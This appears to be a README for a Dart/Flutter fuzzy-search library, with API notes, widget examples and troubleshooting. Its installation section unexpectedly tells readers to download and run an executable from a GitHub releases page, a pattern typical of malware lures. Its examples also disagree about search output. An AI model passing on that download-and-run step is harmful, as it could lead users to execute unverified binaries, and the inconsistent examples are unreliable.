Why this project

Search should feel instant. Users expect typing to narrow results quickly, with minimal delay. This project focuses on delivering a fast, lightweight, and reusable search engine for Dart and Flutter that handles fuzzy matching, typeahead, and autocomplete with a clean API.

- Lightweight footprint: small memory usage and fast indexing.
- Dart-first API: designed for Dart and Flutter, easy to integrate in mobile apps.
- Fuzzy search: tolerant matching that handles typos and variations.
- Typeahead and autocomplete: live suggestions as users type.
- Reusable components: modular widgets that you can drop into your UI.
- Customizable: scoring, tokenization, and UI themes are adjustable.

Core ideas

- Indexing strategy: index only what you search against. Build a compact index of strings and attributes to keep search fast.
- Scoring: use a simple, transparent scoring model. Results are ranked by relevance and proximity to the query.
- Fuzzy matching: implement flexible alignment to accommodate typos and partial matches.
- UI integration: provide ready-made widgets that work with Flutter’s rendering model and state management options.
- Extensibility: hooks for custom tokenization, stemming, or domain-specific scoring.

Getting started

Start small. Add the library to your Dart or Flutter project and try a minimal example. Then expand to more complex data models and UI components.

Prerequisites

- Dart SDK 2.17+ or Flutter 3.0+
- Basic knowledge of Dart data structures
- A Flutter project if you plan to use the Flutter widgets

Installation

- In a Flutter project, add this as a dependency in pubspec.yaml:

  dependencies:
    search: ^0.9.0

- In a Dart project, add the package to your pubspec.yaml similarly and run pub get.

- If you want to use the prebuilt assets, you can download them from the releases page. From the releases page, download the asset matching your platform and run the installer or executable as described in the asset’s instructions. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and run it to set up the library locally if you need a CLI tool or example binaries.

- For web or desktop apps, ensure you enable null safety and the appropriate platform bindings in your project.

Quick start

A minimal example that builds a list of strings and searches through them.

Dart example

```dart
import 'package:search/search.dart';

void main() {
  final items = [
    'Apple',
    'Banana',
    'Grape',
    'Orange',
    'Pineapple',
    'Strawberry',
    'Mango',
  ];

  final engine = SearchEngine<String>(items);

  final results = engine.search('aple'); // fuzzy match for "Apple" or "Pineapple"
  print(results); // ['Apple', 'Pineapple']
}
```

Flutter UI example

```dart
import 'package:flutter/material.dart';
import 'package:search/search_widget.dart';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  final List<String> items = [
    'Almond',
    'Cashew',
    'Hazelnut',
    'Pistachio',
    'Walnut',
    'Brazil Nut',
  ];

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(title: Text('Search Widget Demo')),
        body: Padding(
          padding: const EdgeInsets.all(16.0),
          child: SearchWidget<String>(
            data: items,
            onSelected: (value) => print('Selected: $value'),
          ),
        ),
      ),
    );
  }
}
```

These examples show the essence of the API. You can replace the data type with a more complex model and map fields like title, description, tags, or keywords.

API overview

- SearchEngine<T>
  - Constructor: SearchEngine<T>(List<T> data, {List<String Function(T)> extractors, int maxResults = 20})
  - Methods:
    - void indexData(): builds or rebuilds the internal index
    - List<T> search(String query): returns a list of items sorted by relevance
    - void updateItem(T item, String key, dynamic value): updates a single item in the index
  - Properties:
    - List<T> data
    - int maxResults
- SearchWidget<T>
  - Flutter widget that wires a SearchBar to a ListView
  - Props: data, onSelected, itemBuilder, highlightStyle, debounceTime
- Tokenizer
  - Splits text into tokens for indexing
- Scorer
  - Ranks results with a simple scoring function
- HighlightRenderer
  - Produces rich text with matched parts highlighted

Widgets and components

SearchBar

- A minimal text field with a leading icon and a clear button
- Debounced input to avoid excessive searching
- Integrates with the typeahead overlay to show live suggestions

TypeaheadOverlay

- Displays suggested results as the user types
- Scrollable list with keyboard navigation support
- Highlights the matching parts of each suggestion

SearchList

- Renders a list of results
- Supports empty states and loading indicators
- Animates insertions and removals for smooth UX

SearchWidget

- Combines the above widgets into a cohesive component
- Takes a data source, an item renderer, and a callback for selection
- Easy to reuse across screens

Code sample: Building a search UI with Flutter

```dart
class MySearchScreen extends StatefulWidget {
  @override
  _MySearchScreenState createState() => _MySearchScreenState();
}

class _MySearchScreenState extends State<MySearchScreen> {
  final List<Item> items = Item.sampleData();
  late final SearchEngine<Item> engine;

  @override
  void initState() {
    super.initState();
    engine = SearchEngine<Item>(
      items,
      extractors: [
        (Item it) => it.title,
        (Item it) => it.description,
        (Item it) => it.tags.join(' '),
      ],
      maxResults: 25,
    );
    engine.indexData();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Search Demo')),
      body: SearchWidget<Item>(
        data: items,
        onSelected: (item) => print('Selected: ${item.title}'),
        itemBuilder: (context, item) => ListTile(
          title: Text(item.title),
          subtitle: Text(item.description),
        ),
      ),
    );
  }
}
```

Customization and theming

- Highlight style: customize how matched text is colored or bolded
- Result item layout: supply your own itemBuilder
- Debounce time: adjust input delay to balance responsiveness and load
- Tokenization: plug in your own tokenizer for domain-specific data
- Scoring: implement custom ranking to reflect user intent

Customization examples

- Highlighter: turn on bold for matches

```dart
final highlighter = HighlightStyle(
  matchColor: Colors.orange,
  normalColor: Colors.black87,
  bold: true,
);
```

- Custom tokenizer: break on punctuation or domain terms

```dart
class DomainTokenizer implements Tokenizer<String> {
  @override
  List<String> tokenize(String input) => input.toLowerCase().split(RegExp(r'[\s,.-]+'));
}
```

Accessibility and internationalization

- All UI components expose semantic labels for screen readers.
- Text and hints support localization through Flutter’s localization framework.
- Keyboard navigation works for desktop and web environments.

Performance and optimization

- Indexing is O(n) with a small constant factor. It runs once per dataset update.
- Search runs in near real-time for typical mobile datasets.
- Debouncing reduces CPU usage on fast typists.
- Memory usage depends on the dataset. For typical mobile lists, it remains under a few megabytes.

Data modeling and adapters

- Data adapters map your domain objects to search fields.
- Each item can expose multiple fields for indexing (e.g., title, subtitle, keywords).
- You can combine fields with a simple mapping function.

Data adapter example

```dart
class Product {
  final String id;
  final String name;
  final String description;
  final List<String> tags;

  Product({required this.id, required this.name, required this.description, required this.tags});
}

String extractTitle(Product p) => p.name;
String extractKeywords(Product p) => '${p.name} ${p.tags.join(' ')} ${p.description}';
```

Indexing strategy and incremental updates

- Build an initial index from the dataset.
- When items change, update only affected entries.
- Use a lightweight delta mechanism to keep index up to date.

Testing and quality

- Unit tests cover core logic: tokenization, matching, scoring, and result ranking.
- Widget tests verify UI behavior: typeahead, highlighting, empty states.
- Fuzz testing checks edge cases in tokenization and scoring.

Test snippet

```dart
void main() {
  test('fuzzy match basic', () {
    final items = ['Apple', 'Banana', 'Grape'];
    final engine = SearchEngine<String>(items);
    final results = engine.search('aple');
    expect(results, ['Apple']);
  });
}
```

Accessibility and i18n tests

- Ensure that matched text is readable by screen readers.
- Validate localized strings appear correctly in UI components.

  - You can index multiple fields per item (title, description, tags).
  - The engine combines field scores for final ranking.
- Case-insensitive search
  - Tokenization and normalization ensure searches are case-insensitive by default.
- Diacritic-insensitive search
  - Optional normalization can ignore diacritics for better matches.

Troubleshooting

- No results returned
  - Check that your tokens are being extracted correctly.
  - Ensure the indexData() step runs after you populate your dataset.
  - Verify that the query string is not trimmed and that debouncing does not delay results too long.

- UI lags on large lists
  - Consider paging results and loading only a subset into the UI.
  - Debounce input and use a dedicated isolate if you handle extremely large datasets.

- Keyboard navigation not responding
  - Ensure focus management is correct in Flutter and that your host app allows focus traversal.

Security considerations

- The search engine operates client-side. Do not feed sensitive data to the search index if it should remain private.
- If you extend the engine to fetch data from a remote source, secure the data flow and validate input rigorously.
- Regularly review dependencies for known vulnerabilities.

Conclusion

- This repository provides a practical, fast, and adaptable solution for adding fuzzy search to Dart and Flutter apps.
- It emphasizes a simple API, fast performance, and flexible UI integration.
